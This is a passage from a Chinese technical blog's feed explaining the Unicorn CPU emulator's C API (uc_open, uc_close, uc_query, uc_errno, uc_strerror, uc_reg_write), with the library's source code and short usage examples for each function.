                  !(mode &amp; UC_MODE_BIG_ENDIAN) ||</span><br><span class="line">                        !(mode &amp; (UC_MODE_SPARC32|UC_MODE_SPARC64))) &#123;</span><br><span class="line">                    <span class="built_in">free</span>(uc);</span><br><span class="line">                    <span class="keyword">return</span> UC_ERR_MODE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mode &amp; UC_MODE_SPARC64)</span><br><span class="line">                    uc-&gt;init_arch = sparc64_uc_init;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    uc-&gt;init_arch = sparc_uc_init;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uc-&gt;init_arch == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> UC_ERR_ARCH;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (machine_initialize(uc))</span><br><span class="line">            <span class="keyword">return</span> UC_ERR_RESOURCE;</span><br><span class="line"></span><br><span class="line">        *result = uc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uc-&gt;reg_reset)</span><br><span class="line">            uc-&gt;reg_reset(uc);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_ARCH;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意： uc_open会申请堆内存，使用完必须用uc_close释放，否则会发生泄露</strong></p><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//// 初始化 X86-32bit 模式模拟器</span></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc引擎创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//// 关闭uc</span></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc引擎关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/18/dqKBwAWUL7XvypE.png" alt="image.png"></p><h3 id="uc-close"><a href="#uc-close" class="headerlink" title="uc_close"></a>uc_close</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_close</span><span class="params">(uc_engine *uc)</span></span>;</span><br></pre></td></tr></table></figure><p>关闭一个uc实例，将释放内存。关闭后无法恢复。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: 指向由 uc_open() 返回的指针</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_close</span><span class="params">(uc_engine *uc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_item</span> *<span class="title">cur</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hook</span> *<span class="title">hook</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理内部数据</span></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;release)</span><br><span class="line">        uc-&gt;release(uc-&gt;tcg_ctx);</span><br><span class="line">    g_free(uc-&gt;tcg_ctx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理 CPU.</span></span><br><span class="line">    g_free(uc-&gt;cpu-&gt;tcg_as_listener);</span><br><span class="line">    g_free(uc-&gt;cpu-&gt;thread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理所有 objects.</span></span><br><span class="line">    OBJECT(uc-&gt;machine_state-&gt;accelerator)-&gt;ref = <span class="number">1</span>;</span><br><span class="line">    OBJECT(uc-&gt;machine_state)-&gt;ref = <span class="number">1</span>;</span><br><span class="line">    OBJECT(uc-&gt;owner)-&gt;ref = <span class="number">1</span>;</span><br><span class="line">    OBJECT(uc-&gt;root)-&gt;ref = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    object_unref(uc, OBJECT(uc-&gt;machine_state-&gt;accelerator));</span><br><span class="line">    object_unref(uc, OBJECT(uc-&gt;machine_state));</span><br><span class="line">    object_unref(uc, OBJECT(uc-&gt;cpu));</span><br><span class="line">    object_unref(uc, OBJECT(&amp;uc-&gt;io_mem_notdirty));</span><br><span class="line">    object_unref(uc, OBJECT(&amp;uc-&gt;io_mem_unassigned));</span><br><span class="line">    object_unref(uc, OBJECT(&amp;uc-&gt;io_mem_rom));</span><br><span class="line">    object_unref(uc, OBJECT(uc-&gt;root));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    g_free(uc-&gt;system_memory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放相关线程</span></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;qemu_thread_data)</span><br><span class="line">        g_free(uc-&gt;qemu_thread_data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放其他数据</span></span><br><span class="line">    <span class="built_in">free</span>(uc-&gt;l1_map);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;bounce.buffer) &#123;</span><br><span class="line">        <span class="built_in">free</span>(uc-&gt;bounce.buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g_hash_table_foreach(uc-&gt;type_table, free_table, uc);</span><br><span class="line">    g_hash_table_destroy(uc-&gt;type_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; DIRTY_MEMORY_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(uc-&gt;ram_list.dirty_memory[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放hook和hook列表</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; UC_HOOK_MAX; i++) &#123;</span><br><span class="line">        cur = uc-&gt;hook[i].head;</span><br><span class="line">        <span class="comment">// hook 可存在于多个列表，可通过计数获取释放的时间</span></span><br><span class="line">        <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">            hook = (struct hook *)cur-&gt;data;</span><br><span class="line">            <span class="keyword">if</span> (--hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        list_clear(&amp;uc-&gt;hook[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(uc-&gt;mapped_blocks);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后释放uc自身</span></span><br><span class="line">    <span class="built_in">memset</span>(uc, <span class="number">0</span>, <span class="keyword">sizeof</span>(*uc));</span><br><span class="line">    <span class="built_in">free</span>(uc);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用实例同uc_open()</p><h3 id="uc-query"><a href="#uc-query" class="headerlink" title="uc_query"></a>uc_query</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_query</span><span class="params">(uc_engine *uc, uc_query_type type, <span class="keyword">size_t</span> *result)</span></span>;</span><br></pre></td></tr></table></figure><p>查询引擎的内部状态</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@type: uc_query_type 中枚举的类型</span><br><span class="line"></span><br><span class="line">@result: 保存被查询的内部状态的指针</span><br><span class="line"></span><br><span class="line">@return: 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_query</span><span class="params">(uc_engine *uc, uc_query_type type, <span class="keyword">size_t</span> *result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (type == UC_QUERY_PAGE_SIZE) &#123;</span><br><span class="line">        *result = uc-&gt;target_page_size;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type == UC_QUERY_ARCH) &#123;</span><br><span class="line">        *result = uc-&gt;arch;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(uc-&gt;arch) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICORN_HAS_ARM</span></span><br><span class="line">        <span class="keyword">case</span> UC_ARCH_ARM:</span><br><span class="line">            <span class="keyword">return</span> uc-&gt;query(uc, type, result);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> UC_ERR_ARG;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//// Initialize emulator in X86-32bit mode</span></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> result[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    err = uc_query(uc, UC_QUERY_ARCH, result);   <span class="comment">// 查询架构</span></span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"查询成功: "</span> &lt;&lt; *result &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/18/ZtRKvUoaPTlshJ4.png" alt="image.png"></p><p>架构查询结果为4，对应的正是UC_ARCH_X86</p><h3 id="uc-errno"><a href="#uc-errno" class="headerlink" title="uc_errno"></a>uc_errno</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_errno</span><span class="params">(uc_engine *uc)</span></span>;</span><br></pre></td></tr></table></figure><p>当某个API函数失败时，报告最后的错误号，一旦被访问，uc_errno可能不会保留原来的值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return: 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_errno</span><span class="params">(uc_engine *uc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> uc-&gt;errnum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_errno(uc);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"错误号： "</span> &lt;&lt; err &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/18/IZhyWrGebA5tT4i.png" alt="image.png"></p><p>无错误，输出错误号为0</p><h3 id="uc-strerror"><a href="#uc-strerror" class="headerlink" title="uc_strerror"></a>uc_strerror</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">uc_strerror</span><span class="params">(uc_err code)</span></span>;</span><br></pre></td></tr></table></figure><p>返回给定错误号的解释</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@code: 错误号</span><br><span class="line"></span><br><span class="line">@return: 指向给定错误号的解释的字符串指针</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">uc_strerror</span><span class="params">(uc_err code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(code) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Unknown error code"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_OK:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"OK (UC_ERR_OK)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_NOMEM:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"No memory available or memory not present (UC_ERR_NOMEM)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_ARCH:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid/unsupported architecture (UC_ERR_ARCH)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_HANDLE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid handle (UC_ERR_HANDLE)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_MODE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid mode (UC_ERR_MODE)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_VERSION:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Different API version between core &amp; binding (UC_ERR_VERSION)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_READ_UNMAPPED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid memory read (UC_ERR_READ_UNMAPPED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_WRITE_UNMAPPED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid memory write (UC_ERR_WRITE_UNMAPPED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_FETCH_UNMAPPED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid memory fetch (UC_ERR_FETCH_UNMAPPED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_HOOK:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid hook type (UC_ERR_HOOK)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_INSN_INVALID:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid instruction (UC_ERR_INSN_INVALID)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_MAP:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid memory mapping (UC_ERR_MAP)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_WRITE_PROT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Write to write-protected memory (UC_ERR_WRITE_PROT)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_READ_PROT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Read from non-readable memory (UC_ERR_READ_PROT)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_FETCH_PROT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Fetch from non-executable memory (UC_ERR_FETCH_PROT)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_ARG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Invalid argument (UC_ERR_ARG)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_READ_UNALIGNED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Read from unaligned memory (UC_ERR_READ_UNALIGNED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_WRITE_UNALIGNED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Write to unaligned memory (UC_ERR_WRITE_UNALIGNED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_FETCH_UNALIGNED:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Fetch from unaligned memory (UC_ERR_FETCH_UNALIGNED)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_RESOURCE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Insufficient resource (UC_ERR_RESOURCE)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_EXCEPTION:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Unhandled CPU exception (UC_ERR_EXCEPTION)"</span>;</span><br><span class="line">        <span class="keyword">case</span> UC_ERR_TIMEOUT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Emulation timed out (UC_ERR_TIMEOUT)"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line">    </span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例创建成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_errno(uc);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"错误号： "</span> &lt;&lt; err &lt;&lt; <span class="string">"  错误描述： "</span> &lt;&lt; uc_strerror(err) &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"uc实例关闭成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/18/MbZk8KjQFqJOxmd.png" alt="image.png"></p><p>From <a href="https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(二">https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(二)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例-二&quot;&gt;&lt;a href=&quot;#Unicorn-CPU模拟框架数据类型及API分析与示例-二&quot; class=&quot;headerlink&quot; title=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例(二)&quot;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn-CPU模拟框架数据类型及API分析与示例(三)</title>
    <link href="https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E4%B8%89)/"/>
    <id>https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(三)/</id>
    <published>2020-02-13T05:51:24.777Z</published>
    <updated>2020-02-13T05:55:58.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unicorn-CPU模拟框架数据类型及API分析与示例-三"><a href="#Unicorn-CPU模拟框架数据类型及API分析与示例-三" class="headerlink" title="Unicorn-CPU模拟框架数据类型及API分析与示例(三)"></a>Unicorn-CPU模拟框架数据类型及API分析与示例(三)</h1><h2 id="0x2-API分析"><a href="#0x2-API分析" class="headerlink" title="0x2 API分析"></a>0x2 API分析</h2><h3 id="uc-reg-write"><a href="#uc-reg-write" class="headerlink" title="uc_reg_write"></a>uc_reg_write</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_write</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> regid, <span class="keyword">const</span> <span class="keyword">void</span> *value)</span></span>;</span><br></pre></td></tr></table></figure><p>将值写入寄存器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open()返回的句柄</span><br><span class="line">@regid:  将被修改的寄存器ID</span><br><span class="line">@value:  指向寄存器将被修改成的值的指针</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_write</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> regid, <span class="keyword">const</span> <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> uc_reg_write_batch(uc, &amp;regid, (<span class="keyword">void</span> *<span class="keyword">const</span> *)&amp;value, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uc_err <span class="title">uc_reg_write_batch</span><span class="params">(uc_engine *uc, <span class="keyword">int</span> *ids, <span class="keyword">void</span> *<span class="keyword">const</span> *vals, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = UC_ERR_OK;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;reg_write)</span><br><span class="line">        ret = uc-&gt;reg_write(uc, (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)ids, vals, count);    <span class="comment">//结构体中写入</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> UC_ERR_EXCEPTION; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line"></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!err)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span 